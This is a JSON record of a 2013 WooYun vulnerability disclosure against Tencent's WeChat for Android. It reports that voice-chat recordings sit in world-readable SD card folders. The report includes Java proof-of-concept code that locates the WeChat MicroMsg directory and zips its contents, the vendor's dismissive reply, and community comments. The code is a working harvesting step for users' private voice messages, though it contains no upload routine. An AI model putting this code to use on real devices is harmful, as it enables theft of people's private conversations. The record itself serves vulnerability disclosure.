{"id": 8365, "wybug_id": "wooyun-2013-042365", "wybug_title": "微信对一些数据处理不当，导致恶意app可以任意读取语音聊天发送到远端服务器", "wybug_corp": "腾讯", "wybug_author": "daige13", "wybug_date": "2013-11-08 19:02", "wybug_open_date": "2013-11-08 20:14", "wybug_type": "敏感信息泄露", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 对于im，用户的文字交流与语音交流均属于用户的嫉妒隐私！尤其是女神们，估计不错的话他们语音要多于文字吧！任意恶意app可读取语音记录并发往远程服务器！root与非root均中 详细说明：  文件被存放在下面的路径里/storage/sdcard0/tecent/micromsg/xxx/xxx/voice2/xx/xx/xx.amr   漏洞证明：  利用代码\nimport java.io.File;import java.io.IOException;import android.os.Bundle;import android.app.Activity;import android.view.Menu;import android.widget.Toast;import com.xx.test4wechat.FileUtils;import com.xx.test4wechat.ZipUtils;public class MainActivity extends Activity {\t@Override\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.activity_main);\t\tFileUtils fileUtils = new FileUtils();\t\tString sDir = \"tencent/MicroMsg/\";\t\tString zDir = \"xxx\";\t\tString zipName = \"xxx.zip\";\t\tString SDRoot = fileUtils.getSDCardRoot();\t\tString sourceDir = SDRoot + sDir;\t\tFile sFile = new File(sourceDir);\t\tif(sFile.exists() & sFile.isDirectory()){\t\t\tString dir = SDRoot + zDir;\t\t\tFile zFile = new File(dir);\t\t\tif(!zFile.exists()){\t\t\t\tFile tempFile = fileUtils.createSDDir(dir);\t\t\t}\t\t\tif(!zFile.exists())\t\t\t\tfileUtils.createSDDir(zDir);\t\t\tString zipDir = dir + File.separator + zipName;\t\t\tFile zipDirFile = new File(zipDir);\t\t\tif(!zipDirFile.exists()){\t\t\t\ttry {\t\t\t\t\tfileUtils.createFileInSDCard(zDir, zipName);\t\t\t\t} catch (IOException e1) {\t\t\t\t\t// TODO Auto-generated catch block\t\t\t\t\te1.printStackTrace();\t\t\t\t}\t\t\t}\t\t\ttry {\t\t\t\tZipUtils.zipFiles(sourceDir, zipDir);\t\t\t\tToast.makeText(getApplicationContext(), \"success!!!\", Toast.LENGTH_LONG).show();\t\t\t} catch (IOException e) {\t\t\t\t// TODO Auto-generated catch block\t\t\t\te.printStackTrace();\t\t\t}\t\t}else{\t\t\tToast.makeText(getApplicationContext(), \"failed!!!\", Toast.LENGTH_LONG).show();\t\t}\t\t\t}\t@Override\tpublic boolean onCreateOptionsMenu(Menu menu) {\t\t// Inflate the menu; this adds items to the action bar if it is present.\t\tgetMenuInflater().inflate(R.menu.main, menu);\t\treturn true;\t}}\n\nprivate static final int BUFF_SIZE = 1024 * 1024;\t/**\t * 批量压缩文件\t * @param resFileList  需要压缩的文件\t * @param zipFile 生成的文件\t * @throws IOException 压缩异常\t */\tpublic static void zipFiles(String sourceDir , String zipDir ) throws IOException{\t\tFile zipFile = new File(zipDir);\t\tFile dirFile = new File(sourceDir);\t\tFile[] resFileList = dirFile.listFiles();\t\tZipOutputStream zipOut = null;\t\ttry{\t\t\tzipOut = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile),BUFF_SIZE));\t\t\tfor(File resFile : resFileList){\t\t\t\tzipFile(resFile , zipOut ,\"\");\t\t\t}\t\t} finally {\t\t\tzipOut.close();\t\t}\t}\t/**\t * 批量压缩文件\t * @param resFileList  需要压缩的文件\t * @param zipFile 生成的文件\t * @throws IOException 压缩异常\t */\tpublic static void zipFiles(String sourceDir , String zipDir  , String comment ) throws IOException{\t\tFile zipFile = new File(zipDir);\t\tFile dirFile = new File(sourceDir);\t\tFile[] resFileList = dirFile.listFiles();\t\tZipOutputStream zipOut = null;\t\ttry{\t\t\tzipOut = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile),BUFF_SIZE));\t\t\tfor(File resFile : resFileList){\t\t\t\tzipFile(resFile , zipOut ,\"\");\t\t\t}\t\t\tzipOut.setComment(comment);\t\t} finally {\t\t\tzipOut.close();\t\t}\t}\t/**\t * 压缩文件\t * @param resFile 需要压缩的文件或者文件夹\t * @param zipOut 压缩文件的目的文件\t * @param rootPath 压缩文件的路径\t * @throws UnsupportedEncodingException 找不到文件的异常\t * @throws IOException 压缩错误异常\t */\tprivate static void zipFile(File resFile, ZipOutputStream zipOut,String rootPath) throws UnsupportedEncodingException , IOException {\t\t// TODO Auto-generated method stub\t\trootPath = rootPath + ((rootPath.trim().length() == 0)?\"\" : File.separator) + resFile.getName();\t\trootPath = new String(rootPath.getBytes(\"8859_1\"),\"GB2312\");\t\tBufferedInputStream input = null;\t\ttry{\t\t\tif(resFile.isDirectory()){\t\t\t\tFile[] fileList = resFile.listFiles();\t\t\t\tfor(File file : fileList){\t\t\t\t\tzipFile(file , zipOut , rootPath);\t\t\t\t}\t\t\t}else{\t\t\t\tbyte buffer[] = new byte[BUFF_SIZE];\t\t\t\tinput = new BufferedInputStream(new FileInputStream(resFile) , BUFF_SIZE);\t\t\t\tzipOut.putNextEntry(new ZipEntry(rootPath));\t\t\t\tint realLength;\t\t\t\twhile((realLength = input.read(buffer)) != -1){\t\t\t\t\tzipOut.write(buffer , 0 , realLength);\t\t\t\t}\t\t\t\tinput.close();\t\t\t\tzipOut.flush();\t\t\t\tzipOut.closeEntry();\t\t\t\t}\t\t} finally{\t\t\tif (input != null)\t\t\t\tinput.close();\t\t}\t}\n\npublic File createFileInSDCard(String dir,String fileName) throws IOException{\t\tFile file = new File(SDCardRoot + dir + File.separator + fileName);\t\tfile.createNewFile();\t\tfile.canWrite();\t\treturn file;\t}\t/**\t * 在SD卡上创建目录\t * @param dir 目录路径\t * @return\t */\tpublic File createSDDir(String dir){\t\tFile dirFile = new File(SDCardRoot + dir + File.separator);\t\tif(!dirFile.exists()){\t\t\tdirFile.mkdirs();\t\t}\t\tdirFile.canWrite();\t\treturn dirFile;\t}\n\npublic String getSDState(){\t\treturn SDStateString;\t}\tpublic String getSDCardRoot(){\t\treturn SDCardRoot;\t}\n\n\n\n\n\n\n   修复方案：  ....   版权声明：转载请注明来源 daige13@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-08 20:14 厂商回复： 非常感谢您的报告，andriod操作系统的设计使app都可以读取SD卡内容（只要用户同意读写权限），此问题我们认为风险较低，暂不修复。针对这种恶意app的情况，您可以通过安装QQ手机管家来增强对微信隐私的保护能力。我们会持续增强微信的安全保护能力，再次感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-08 20:01 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-11-08 20:21 |    \t\t一灯大师 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:28        | 一盏灯，也能让世界安全)\t\t \n  语音太大，处理起来估摸着软件就打折扣了    \n     2013-11-08 20:30 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  针对这种恶意app的情况，您可以通过安装QQ手机管家来增强对微信隐私的保护能力。    \n     2013-11-08 21:00 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  针对这种恶意app的情况，您可以通过36x卫士来增强对微信隐私的保护能力。    \n     2013-11-08 21:45 |    \t\t小米 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | 性别男 爱好女 看AV我最行 要装逼找Helen ...)\t\t \n  此问题我们认为风险较低，暂不修复！    \n     2013-11-08 22:45 |    \t\t温顺密斯 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 微笑的迪妮莎~)\t\t \n  针对这种恶意app的情况，您可以通过360安全卫士来增强对微信隐私的保护能力。    \n     2013-11-08 23:55 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  针对这种恶意app的情况，您还是洗洗睡吧    \n     2013-11-09 11:41 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  假如你发现了可以不经过对方同意恶意安装app再说吧。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}